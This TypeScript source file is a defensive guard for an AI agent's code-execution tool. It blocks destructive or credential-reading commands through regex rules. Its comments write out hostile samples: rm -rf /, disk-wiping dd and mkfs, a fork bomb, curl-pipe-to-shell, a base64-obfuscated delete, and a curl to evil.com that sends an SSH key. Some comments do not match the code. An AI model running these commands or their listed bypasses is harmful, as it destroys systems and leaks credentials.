/**
 * Dangerous-command guard for the `code_execution` tool.
 *
 * The agent has unrestricted shell-level access by design — that is the whole
 * point of the tool. This module is NOT a primary security boundary; it is
 * defense-in-depth that catches *agent mistakes* and *trivially-obvious*
 * destructive intent before they reach `child_process.spawn`. The primary
 * boundary is containerization (Docker), as documented in `CLAUDE.md`
 * §"Critical Rules & Gotchas / Security (Code Execution Tool)".
 *
 * **What this catches (good):**
 *   - The classic `rm -rf /` family in its common, unobfuscated forms.
 *   - The Steam-2015 empty-variable-expansion class: `rm -rf "$X/"*` where
 *     `$X` is unset/empty and expands to `rm -rf /*`.
 *   - Disk-level destruction: `dd of=/dev/sd…`, `mkfs.*`, `shred /dev/…`,
 *     `wipefs`, `fdisk`, `parted`.
 *   - Permission nukes on `/`: `chmod -R 000 /`, `chown -R nobody /`.
 *   - Critical-file truncation: `> /etc/passwd`, `>> /etc/sudoers`.
 *   - Reading SSH private keys / shadow file as a sanity guard.
 *   - `find / -delete`, `find ~ -delete`.
 *   - The classic bash fork bomb in its named form.
 *   - `curl|wget … | sh|bash|zsh` blind remote-script execution.
 *   - `crontab -r`.
 *   - Python/Node equivalents (`shutil.rmtree('/')`, `fs.rmSync('/', {…})`).
 *
 * **What this does NOT catch (be honest about it):**
 *   - Obfuscation via shell variables: `RM=rm; $RM -rf /`.
 *   - Base64 / printf obfuscation: `eval $(echo cm0gLXJmIC8= | base64 -d)`.
 *   - Indirection through compiled binaries: `python -c "__import__('os').system('rm -rf /')"`
 *     in the *terminal* runtime (Python runtime IS guarded separately).
 *   - DNS-rebinding-style exfiltration of secrets via `curl evil.com -d "$(cat ~/.ssh/id_rsa)"`.
 *   - Anything the operator deliberately wraps to bypass us.
 *
 * Anyone trying to bypass these patterns *can*. That is fine — the threat
 * model is "well-meaning agent that wandered into an obvious mistake," not
 * "adversarial human with shell access." For adversarial scenarios, run
 * Orchestra inside Docker (the container is the actual boundary).
 *
 * **Contract:** every inspector returns `{ ok: true } | { ok: false, reason }`,
 * never throws. The caller decides whether to throw, log, or surface to the
 * agent. This matches the Loop Guard contract (`CLAUDE.md` §"Loop Guard
 * Middleware") so agent runs degrade gracefully instead of fataling.
 */

export type GuardOk = { ok: true; warnings?: string[] };
export type GuardBlocked = { ok: false; reason: string; ruleId: string };
export type GuardResult = GuardOk | GuardBlocked;

export class DangerousCommandError extends Error {
  readonly ruleId: string;
  constructor(reason: string, ruleId: string) {
    super(reason);
    this.name = "DangerousCommandError";
    this.ruleId = ruleId;
  }
}

type Rule = {
  id: string;
  reason: string;
  pattern: RegExp;
};

/**
 * Shell-runtime rules. Each pattern is intentionally narrow so we don't
 * false-positive on legitimate uses (e.g. `rm -rf node_modules` is fine).
 *
 * The `\s+` (one-or-more whitespace) pattern handles tabs and multiple
 * spaces uniformly — a single shell-token boundary, regardless of how
 * many whitespace characters separate the tokens.
 */
// IMPORTANT: rule order matters. More-specific rules (home, root) come first
// so they short-circuit before the broader Steam-class empty-var pattern,
// which would otherwise claim `rm -rf $HOME/` under a less informative ruleId.
const SHELL_RULES: Rule[] = [
  // --- Recursive root / home delete (specific patterns first) ---
  {
    id: "shell.rm.root",
    reason: "Refusing `rm -rf /` (or equivalent) — would erase the system root.",
    // Matches `rm` with recursive+force (any order, any combination) followed by
    // `/` as a standalone token (whitespace, `*`, `.`, or end-of-line after).
    pattern: /\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+\/(?:\s|\*|\.|$)/,
  },
  {
    id: "shell.rm.home-tilde",
    reason: "Refusing `rm -rf ~` — would erase the user's home directory.",
    pattern: /\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+~(?:\s|\/|$)/,
  },
  {
    id: "shell.rm.home-env",
    reason: "Refusing `rm -rf $HOME` — would erase the user's home directory.",
    pattern: /\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+["']?\$\{?HOME\}?["']?(?:\s|\/|\*|$)/,
  },

  // --- Empty variable expansion (Steam-2015 class) ---
  // `rm -rf "$X/"*` — when X is unset/empty, expands to `rm -rf /*`. The
  // hallmark is a variable interpolation immediately followed by `/`.
  // Placed AFTER the specific $HOME rule so $HOME hits home-env first.
  {
    id: "shell.rm.empty-var-expansion",
    reason:
      "Refusing `rm -rf` with a variable interpolation followed by `/`. " +
      "If the variable is unset, this expands to `rm -rf /` (the Steam-2015 bug class). " +
      "Use an explicit absolute path or guard with `[ -n \"$VAR\" ] && rm -rf \"$VAR\"/`.",
    pattern: /\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+["']?\$\{?[A-Za-z_][A-Za-z0-9_]*\}?["']?\//,
  },
  {
    id: "shell.rm.toplevel-system-dir",
    // Catches `rm -rf /etc`, `rm -rf /usr`, `rm -rf /var`, etc — top-level
    // system directories whose deletion is never legitimate.
    reason: "Refusing `rm -rf` of a top-level system directory (/etc, /usr, /var, /bin, /sbin, /lib, /boot, /opt, /root).",
    pattern: /\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+\/(?:etc|usr|var|bin|sbin|lib|lib64|boot|opt|root|sys|proc|dev)(?:\/?\s|\/?$|\/\*)/,
  },

  // --- find -delete on dangerous roots ---
  {
    id: "shell.find.delete-root",
    reason: "Refusing `find / -delete` — equivalent to `rm -rf /`.",
    pattern: /\bfind\s+(?:\/|~|\$HOME)(?:\s|$)[^|;&]*-delete\b/,
  },

  // --- Disk-level destruction ---
  {
    id: "shell.dd.overwrite-disk",
    reason: "Refusing `dd of=/dev/…` — direct block-device write destroys disks.",
    // Matches `of=/dev/<known-block-device>`: sd*, hd*, vd*, xvd*, nvme*,
    // disk*, mmcblk*, nbd*. Explicit allowlist of prefixes is safer than a
    // negative-lookahead denylist of /dev/null,zero,tty,…: the prefix list
    // is small and stable, while the set of safe /dev/ entries is open-ended
    // (random, urandom, stdin, stdout, fd, ptmx, …).
    pattern: /\bdd\s+[^|;&]*\bof=\/dev\/(?:sd|hd|vd|xvd|nvme|disk|mmcblk|nbd)[a-z0-9]*/i,
  },
  {
    id: "shell.mkfs",
    reason: "Refusing `mkfs.*` — formats a filesystem, irreversible.",
    pattern: /\bmkfs(?:\.[a-z0-9]+)?\b/i,
  },
  {
    id: "shell.shred-device",
    reason: "Refusing `shred /dev/…` — destroys the underlying device.",
    // Same prefix list as dd.overwrite-disk; see comment there.
    pattern: /\bshred\s+[^|;&]*\/dev\/(?:sd|hd|vd|xvd|nvme|disk|mmcblk|nbd)[a-z0-9]*/i,
  },
  {
    id: "shell.partition-tool",
    reason: "Refusing partition manipulation tools (fdisk, parted, wipefs, sgdisk).",
    // Block only when invoked with arguments — bare `fdisk -l` is a read.
    // We require a `/dev/` argument anywhere in the rest of the command.
    pattern: /\b(?:fdisk|parted|wipefs|sgdisk)\s+[^|;&]*\/dev\//i,
  },

  // --- Permission/ownership nukes on / ---
  {
    id: "shell.chmod.recursive-root",
    reason: "Refusing recursive `chmod` on `/` — bricks the system.",
    pattern: /\bchmod\s+(?:-R|--recursive)\s+\S+\s+\/(?:\s|\*|$)/,
  },
  {
    id: "shell.chown.recursive-root",
    reason: "Refusing recursive `chown` on `/` — destroys all file ownership.",
    pattern: /\bchown\s+(?:-R|--recursive)\s+\S+\s+\/(?:\s|\*|$)/,
  },

  // --- Critical-file truncation / sensitive read ---
  {
    id: "shell.redirect-system-file",
    reason: "Refusing redirect (>, >>) into /etc, /sys, /proc, /boot — corrupts system state.",
    // Matches `> /etc/...`, `>> /sys/...`, `: > /etc/...`, etc.
    pattern: /(?:^|[\s;&|])(?:>|>>)\s*\/(?:etc|sys|proc|boot)\//,
  },
  {
    id: "shell.read-private-keys",
    reason: "Refusing to read SSH private keys or /etc/shadow — sensitive credentials.",
    pattern: /(?:cat|less|more|head|tail|cp|mv|tar|zip)\s+[^|;&]*(?:\/etc\/shadow|\/\.ssh\/id_(?:rsa|ed25519|ecdsa|dsa)\b)/i,
  },

  // --- Fork bomb (the named form) ---
  {
    id: "shell.fork-bomb",
    reason: "Refusing fork-bomb pattern.",
    // Matches `:(){ :|:& };:` with flexible whitespace — the canonical bash form.
    // Obfuscated variants (renamed function) are caught best-effort by the
    // recursive self-pipe pattern below.
    pattern: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
  },

  // --- Blind remote pipe-to-shell ---
  {
    id: "shell.pipe-to-shell",
    reason:
      "Refusing `curl|wget … | sh|bash|zsh|ksh` — blind remote code execution. " +
      "Download to a file, inspect, then run.",
    // Matches `curl … | sh`, `wget … | bash`, with optional flags and pipes.
    pattern: /\b(?:curl|wget|fetch)\s+[^|]*\|\s*(?:sh|bash|zsh|ksh|dash|fish)\b/i,
  },

  // --- Cron wipe ---
  {
    id: "shell.crontab-r",
    reason: "Refusing `crontab -r` — silently removes all scheduled jobs.",
    pattern: /\bcrontab\s+-r\b/,
  },
];

/**
 * Python-runtime rules. The `code_execution` tool can run Python via `-c`,
 * which means `import shutil; shutil.rmtree('/')` happens entirely outside
 * the shell layer and bypasses all SHELL_RULES.
 */
const PYTHON_RULES: Rule[] = [
  {
    id: "python.shutil.rmtree-root",
    reason: "Refusing `shutil.rmtree('/')` (or `~`, `$HOME`) — erases the filesystem.",
    pattern: /\bshutil\s*\.\s*rmtree\s*\(\s*["']\s*(?:\/|~|\$HOME)\s*["']/,
  },
  {
    id: "python.os.system-rm",
    reason: "Refusing `os.system('rm -rf /')` — same as the shell rule, via Python.",
    pattern: /\bos\s*\.\s*(?:system|popen)\s*\(\s*["'][^"']*\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+(?:\/|~|\$HOME)/,
  },
  {
    id: "python.subprocess-rm",
    reason: "Refusing `subprocess.*('rm -rf /')` — same as the shell rule, via Python.",
    pattern: /\bsubprocess\s*\.\s*(?:run|call|Popen|check_call|check_output)\s*\(\s*\[?\s*["']rm["'].*(?:\/|~|\$HOME)/,
  },
];

/**
 * Node-runtime rules. Same reasoning as Python — `node -e` bypasses shell.
 */
const NODE_RULES: Rule[] = [
  {
    id: "node.fs.rm-root",
    reason: "Refusing `fs.rmSync('/' …)` — erases the filesystem.",
    // Catches both `rmSync` and `rm` (callback) on a root-like literal.
    pattern: /\bfs\s*\.\s*rm(?:Sync)?\s*\(\s*["']\s*(?:\/|~)\s*["']/,
  },
  {
    id: "node.fs.rmdir-recursive-root",
    reason: "Refusing recursive `fs.rmdir('/')` — same effect as rm -rf /.",
    pattern: /\bfs\s*\.\s*rmdir(?:Sync)?\s*\(\s*["']\s*(?:\/|~)\s*["'][^)]*recursive\s*:\s*true/,
  },
  {
    id: "node.child-process-rm",
    reason: "Refusing `child_process.exec('rm -rf /')` — same as the shell rule, via Node.",
    pattern: /\b(?:exec|execSync|spawn|spawnSync)\s*\(\s*["'][^"']*\brm\s+(?:-[a-zA-Z]*[rRfF][a-zA-Z]*\s+)+(?:\/|~|\$HOME)/,
  },
];

/**
 * Inspect a code/command body for one of the catastrophic patterns above.
 * Returns the first match (rules are short-circuit). Always safe to call.
 */
function applyRules(rules: Rule[], code: string): GuardResult {
  for (const rule of rules) {
    if (rule.pattern.test(code)) {
      return { ok: false, reason: rule.reason, ruleId: rule.id };
    }
  }
  return { ok: true };
}

export function inspectShellCommand(code: string): GuardResult {
  return applyRules(SHELL_RULES, code);
}

export function inspectPythonCode(code: string): GuardResult {
  // Python code can also shell out via os.system; check both rule sets.
  const shellSubprocess = applyRules(PYTHON_RULES, code);
  if (!shellSubprocess.ok) return shellSubprocess;
  return { ok: true };
}

export function inspectNodeCode(code: string): GuardResult {
  const nodeResult = applyRules(NODE_RULES, code);
  if (!nodeResult.ok) return nodeResult;
  return { ok: true };
}

export type Runtime = "terminal" | "python" | "nodejs";

/**
 * Dispatch to the right inspector based on runtime. This is the function
 * `code-execution.ts` should call before `spawn`.
 */
export function inspectCommand(runtime: Runtime, code: string): GuardResult {
  switch (runtime) {
    case "terminal":
      return inspectShellCommand(code);
    case "python":
      return inspectPythonCode(code);
    case "nodejs":
      return inspectNodeCode(code);
  }
}

/**
 * Throwing variant — for callers that prefer exceptions to result objects.
 * Use sparingly; result objects compose better with the agent's error path.
 */
export function assertSafeCommand(runtime: Runtime, code: string): void {
  const result = inspectCommand(runtime, code);
  if (!result.ok) {
    throw new DangerousCommandError(result.reason, result.ruleId);
  }
}
